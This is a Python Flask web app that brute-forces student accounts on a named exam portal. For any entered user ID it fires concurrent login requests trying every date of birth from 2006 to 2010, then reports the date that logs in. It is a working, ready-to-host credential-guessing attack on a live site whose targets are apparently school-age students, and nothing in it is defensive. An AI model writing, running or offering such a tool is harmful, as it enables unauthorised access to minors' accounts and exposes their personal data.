import aiohttp
import asyncio
import time
from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

# URL of the login page
login_url = 'https://praveshexam.in/Student/auth'

# Target redirect page after successful login
success_url = 'https://praveshexam.in/Student/attempts/'

# List of months and days in a non-leap year
months = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12']
days_in_month = {
    '01': 31, '02': 28, '03': 31, '04': 30, '05': 31, '06': 30,
    '07': 31, '08': 31, '09': 30, '10': 31, '11': 30, '12': 31
}

# Function to check if the UID and DOB combination is correct
async def check_credentials(session, uid, dob_day, dob_month, dob_year):
    data = {
        'username': uid,
        'day': dob_day,
        'month': dob_month,
        'year': dob_year,
        'institute_id': '5'
    }
    try:
        async with session.post(login_url, data=data) as response:
            # Check if we redirected to the success URL
            if response.url.human_repr() == success_url:
                return True, f"{dob_day}-{dob_month}-{dob_year}"  # Return the valid DOB
    except Exception as e:
        print(f"Error checking {uid}, DOB: {dob_day}-{dob_month}-{dob_year} - {e}")
    return False, None

# Function to generate all possible DOB combinations for a given year
async def check_all_dobs(session, uid, year):
    tasks = []
    for month in months:
        for day in range(1, days_in_month[month] + 1):
            dob_day = str(day).zfill(2)  # Pad the day with leading zero if necessary
            tasks.append(check_credentials(session, uid, dob_day, month, year))

    # Run tasks concurrently, limiting concurrency using a semaphore
    semaphore = asyncio.Semaphore(100)

    # Helper function to use the semaphore
    async def bounded_check(dob_task):
        async with semaphore:
            return await dob_task

    # Run tasks concurrently and return the first successful login
    results = await asyncio.gather(*[bounded_check(task) for task in tasks])
    for success, valid_dob in results:
        if success:
            return valid_dob
    return None

# Function to check DOBs for multiple years using concurrent processing
async def check_multiple_years(uid, years):
    async with aiohttp.ClientSession() as session:
        for year in years:
            year_result = await check_all_dobs(session, uid, year)
            if year_result:
                return year_result  # Return valid DOB for the year
    return None
# Route to handle the user input and process the check
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        uid = request.form['uid']
        start_time = time.time()
        
        # Updated order of years to check
        years_to_check = ['2008', '2007', '2009', '2010', '2006']
        
        # Run the checks for all the years concurrently
        valid_dob = asyncio.run(check_multiple_years(uid, years_to_check))
        
        time_taken = time.time() - start_time
        return render_template('result.html', uid=uid, valid_dob=valid_dob, time_taken=time_taken)
    
    return render_template('index.html')
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
